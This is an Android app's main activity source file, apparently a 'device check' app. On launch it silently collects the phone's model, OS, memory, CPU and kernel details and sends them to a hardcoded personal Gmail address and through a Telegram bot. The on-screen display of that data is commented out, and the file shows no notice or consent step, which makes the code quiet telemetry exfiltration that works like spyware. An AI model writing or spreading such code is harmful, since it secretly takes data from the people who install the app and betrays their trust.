package com.example.mycheck;

import androidx.appcompat.app.AppCompatActivity;
import androidx.collection.ArrayMap;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.os.Build;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

import com.pengrad.telegrambot.model.Update;

import java.io.IOException;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {
    TextView text;
    private ArrayAdapter<String> adapter;

    @SuppressLint("MissingPermission")
    @TargetApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final ArrayList<String> data = new ArrayList<>();

        //Add Data
        ArrayMap<String, String> deviceDataMap = new ArrayMap<>();

        // Setup the value to be returned when result is either not found or invalid/null
        EasyDeviceInfo.setNotFoundVal("na");
        // Enable Debugging when in Debug build
        if (BuildConfig.DEBUG) {
            EasyDeviceInfo.debug();
        }

        // Config Mod
        EasyConfigMod easyConfigMod = new EasyConfigMod(this);
        deviceDataMap.put("Date", String.valueOf(easyConfigMod.getCurrentDate()));


        // Device Mod
        EasyDeviceMod easyDeviceMod = new EasyDeviceMod(this);
        deviceDataMap.put("Language", easyDeviceMod.getLanguage());

        deviceDataMap.put("OS Release", easyDeviceMod.getOSRelease());
        deviceDataMap.put("Manufacturer", easyDeviceMod.getManufacturer());
        deviceDataMap.put("Model", easyDeviceMod.getModel());
        deviceDataMap.put("OS Codename", easyDeviceMod.getOSCodename());
        deviceDataMap.put("OS Version", easyDeviceMod.getOSVersion());
        deviceDataMap.put("Display Version (Build number)", easyDeviceMod.getDisplayVersion());


        deviceDataMap.put("Product ", easyDeviceMod.getProduct());
        deviceDataMap.put("Device", easyDeviceMod.getDevice());

        deviceDataMap.put("Build Brand", easyDeviceMod.getBuildBrand());

        @DeviceType int deviceType = easyDeviceMod.getDeviceType(this);
        switch (deviceType) {
            case DeviceType.WATCH:
                deviceDataMap.put("Device type", "watch");
                break;
            case DeviceType.PHONE:
                deviceDataMap.put("Device type", "phone");
                break;
            case DeviceType.PHABLET:
                deviceDataMap.put("Device type", "phablet");
                break;
            case DeviceType.TABLET:
                deviceDataMap.put("Device type", "tablet");
                break;
            case DeviceType.TV:
                deviceDataMap.put("Device type", "tv");
                break;
            default:
                //do nothing
                break;
        }

        @PhoneType int phoneType = easyDeviceMod.getPhoneType();
        switch (phoneType) {

            case PhoneType.CDMA:
                deviceDataMap.put("Phone_type", "CDMA");
                break;
            case PhoneType.GSM:
                deviceDataMap.put("Phone_type", "GSM");
                break;
            case PhoneType.NONE:
                deviceDataMap.put("Phone_type", "None");
                break;
            default:
                deviceDataMap.put("Phone_type", "Unknown");
                break;
        }

        // Memory Mod
        EasyMemoryMod easyMemoryMod = new EasyMemoryMod(this);
        deviceDataMap.put("Total RAM",
                String.valueOf(easyMemoryMod.convertToGb(easyMemoryMod.getTotalRAM())) + " Gb");
        deviceDataMap.put("Available Internal Memory",
                easyMemoryMod.convertToGb(easyMemoryMod.getAvailableInternalMemorySize())
                        + " Gb");
        deviceDataMap.put("Total Internal Memory",
                easyMemoryMod.convertToGb(easyMemoryMod.getTotalInternalMemorySize())
                        + " Gb");


        // CPU Mod
        EasyCpuMod easyCpuMod = new EasyCpuMod();
        try {
            deviceDataMap.putAll(easyCpuMod.getCPUInfo());
        } catch (IOException e) {
            e.printStackTrace();
        }

        SystemData mySystemData = new SystemData();
        deviceDataMap.put("Kernel", mySystemData.getKernelVersion());
        String text = "";
        for (String key : deviceDataMap.keySet()) {
            data.add(key + " : " + deviceDataMap.get(key));
            text+=key+" : "+deviceDataMap.get(key)+"\n";
        }
        //SendingMessage.sendMail(text);
        this.sendMail(text);
        this.sendTelegram(text);
//        ListView lv = findViewById(R.id.listview);
//        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, data);
//        lv.setAdapter(adapter);
//        this.sendMail(text);
    }
    private void sendMail(String text) {

        String mail = "kamilamalikova173@gmail.com";
        String message = text;
        String subject = "Data";

        //Send Mail
        JavaMailApi javaMailAPI = new JavaMailApi(this,mail,subject,message);

        javaMailAPI.execute();
    }
    private void sendTelegram(String text){
        JavaTelegramApi telegramApi = new JavaTelegramApi(text);
        telegramApi.execute();
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        finish();
    }
}